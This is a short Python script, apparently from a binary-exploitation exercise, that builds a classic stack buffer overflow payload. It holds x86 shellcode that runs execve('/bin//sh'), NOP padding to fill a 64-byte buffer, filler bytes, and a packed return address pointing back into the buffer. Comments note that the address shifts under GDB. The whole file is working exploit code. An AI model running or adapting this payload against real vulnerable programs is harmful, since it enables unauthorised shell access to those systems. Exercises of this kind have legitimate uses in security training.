import struct

#payload = "A"*64
#shellcode = "\xB8\x01\x00\x00\x00\xBB\x04\x00\x00\x00\xCD\x80" #sys_exit(4) BUFFER
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"
payload = shellcode + '\x90'*(64-len(shellcode))
payload += "X"*8
payload += "B"*4
payload += struct.pack("I", 0xffffd470) # Address of the buffer where to jump to
# THE BUFFER ADDRESS IS NOT THE SAME WITH AND WITHOUT GDB !!!

print(payload)